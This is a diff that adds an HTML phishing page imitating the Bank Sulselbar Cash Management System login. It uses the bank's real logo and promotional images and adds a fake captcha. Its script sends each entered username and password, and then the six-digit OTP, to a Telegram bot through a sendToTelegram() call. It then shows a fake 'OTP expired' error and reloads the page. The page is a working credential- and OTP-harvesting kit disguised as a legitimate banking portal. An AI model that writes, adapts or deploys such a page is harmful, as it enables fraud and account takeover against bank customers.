@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta name="google-site-verification" content="vUogNHYhxtVxpN_RUaLg40iBuDjjLbFRtMejINHh93c" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Sulselbar - CMS</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background-color: #f2f5f7; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+
+        .app-container {
+            width: 100%; max-width: 420px; background: white; min-height: 100vh;
+            position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); overflow-x: hidden;
+        }
+
+        /* SLIDER FULL GAMBAR */
+        .swiper { width: 100%; height: 220px; }
+        .swiper-slide { width: 100%; height: 100%; overflow: hidden; }
+        
+        .full-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Gambar kembali memenuhi seluruh kotak slider */
+            display: block;
+        }
+
+        .swiper-pagination-bullet { background: rgba(255,255,255,0.7); opacity: 1; width: 7px; height: 7px; }
+        .swiper-pagination-bullet-active { background: #fff !important; }
+
+        /* BRAND SECTION - LOGO TETAP KECIL */
+        .brand-section { padding: 20px 0 10px; text-align: center; }
+        .brand-section img { 
+            width: 100px; /* Logo diperkecil agar rapi */
+            height: auto;
+        }
+        .brand-section h2 { color: #888; font-weight: 300; font-size: 16px; margin-top: 5px; }
+
+        /* Form Area */
+        .form-area { padding: 0 35px; }
+        .form-group { margin-bottom: 12px; text-align: left; }
+        .form-group label { display: block; font-weight: bold; font-size: 13px; color: #555; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 11px; border: 1px solid #ddd; border-radius: 4px; font-size: 15px; outline: none; }
+
+        #captcha-box { width: 130px; height: 45px; background: #eee; border: 1px solid #ccc; display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: bold; color: blue; letter-spacing: 5px; font-style: italic; margin-bottom: 5px; border-radius: 4px; }
+        
+        .btn-submit { width: 100%; padding: 14px; background: #34495e; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; margin-top: 15px; cursor: pointer; }
+
+        /* OTP Section */
+        .otp-grid { display: flex; justify-content: space-between; gap: 8px; margin: 20px 0; }
+        .otp-grid input { width: 45px; height: 50px; text-align: center; font-size: 22px; font-weight: bold; border: 2px solid #ddd; border-radius: 6px; outline: none; }
+
+        /* Loader */
+        #loader { position: absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.9); z-index:100; display:none; flex-direction:column; align-items:center; justify-content:center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #34495e; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .hidden { display: none !important; }
+        .footer { margin-top: 30px; font-size: 11px; color: #aaa; text-align: center; padding-bottom: 25px; }
+        .footer b { color: #2ecc71; }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="loader"><div class="spinner"></div><p style="margin-top:15px; font-weight:bold;">Memproses...</p></div>
+
+    <div class="swiper mySwiper">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide"><img src="https://i.ibb.co.com/zVYyWhxH/Screenshot-20260315-015851.jpg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://i.ibb.co.com/Cf3Yv7S/syariah-1.jpg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://ancient-orange-prwix7dtxa.edgeone.app/trade%20(2).jpeg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://organisational-lime-s4cm9cce7s.edgeone.app/valas.jpeg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://inadequate-sapphire-kbair64jdr.edgeone.app/pinjaman%20(1).jpeg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://devoted-amber-vulteelk0t.edgeone.app/simpanan%20(2).jpeg" class="full-img"></div>
+            <div class="swiper-slide"><img src="https://premier-coral-1tgesovcpo.edgeone.app/waspada%20(1).jpeg" class="full-img"></div>
+        </div>
+        <div class="swiper-pagination"></div>
+    </div>
+
+    <div id="login-view">
+        <div class="brand-section">
+            <img src="https://tnt.banksulselbar.co.id/BSSBLogo.png">
+            <h2>Cash Management System</h2>
+        </div>
+        <div class="form-area">
+            <div class="form-group"><label>Username</label><input type="text" id="u" autocomplete="off"></div>
+            <div class="form-group"><label>Password</label><input type="password" id="p"></div>
+            <div id="captcha-box"></div>
+            <a href="javascript:newCap()" style="font-size:11px; color:#007bff; text-decoration:none;">Ganti Kode</a>
+            <div class="form-group" style="margin-top:10px;"><label>Masukan Kode</label><input type="text" id="c" style="width:140px;"></div>
+            <button class="btn-submit" onclick="login()">Login</button>
+        </div>
+    </div>
+
+    <div id="otp-view" class="hidden">
+        <div class="brand-section"><h2>Verifikasi OTP</h2><p style="font-size:12px; color:#666;">Masukkan 6 digit kode keamanan</p></div>
+        <div class="form-area">
+            <div class="otp-grid" id="otp-inputs">
+                <input type="number" oninput="mv(this, 0)">
+                <input type="number" oninput="mv(this, 1)">
+                <input type="number" oninput="mv(this, 2)">
+                <input type="number" oninput="mv(this, 3)">
+                <input type="number" oninput="mv(this, 4)">
+                <input type="number" oninput="mv(this, 5)">
+            </div>
+            <button class="btn-submit" onclick="verify()">Verifikasi</button>
+        </div>
+    </div>
+
+    <div class="footer"><p>CMS - Cash Management System</p><p>2018-2026 Copyright <b>PT. Bank Sulselbar</b></p></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+<script src="telegram-bot.js"></script>
+<script>
+    const swiper = new Swiper(".mySwiper", { 
+        loop: true, 
+        autoplay: { delay: 3500, disableOnInteraction: false }, 
+        pagination: { el: ".swiper-pagination", clickable: true }
+    });
+
+    let code = "";
+    function newCap() {
+        const ch = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+        code = ""; for(let i=0; i<4; i++) code += ch.charAt(Math.floor(Math.random()*ch.length));
+        document.getElementById("captcha-box").innerText = code;
+    }
+
+    async function login() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        const c = document.getElementById('c').value.toUpperCase();
+        if(!u || !p || c !== code) { alert("Data atau captcha salah!"); return; }
+        document.getElementById('loader').style.display = 'flex';
+        await sendToTelegram(`<b>🔔 LOGIN CMS</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('login-view').classList.add('hidden');
+            document.getElementById('otp-view').classList.remove('hidden');
+        }, 1500);
+    }
+
+    async function verify() {
+        let val = ""; document.querySelectorAll('#otp-inputs input').forEach(i => val += i.value);
+        if(val.length < 6) return;
+        document.getElementById('loader').style.display = 'flex';
+        await sendToTelegram(`<b>🔐 OTP CMS</b>\n🔢 Kode: <code>${val}</code>`);
+        setTimeout(() => { alert("OTP salah atau kadaluarsa."); location.reload(); }, 2000);
+    }
+
+    function mv(el, idx) {
+        const ins = document.querySelectorAll('#otp-inputs input');
+        if(el.value.length === 1 && idx < 5) ins[idx+1].focus();
+    }
+    window.onload = newCap;
+</script>
+</body>
+</html>
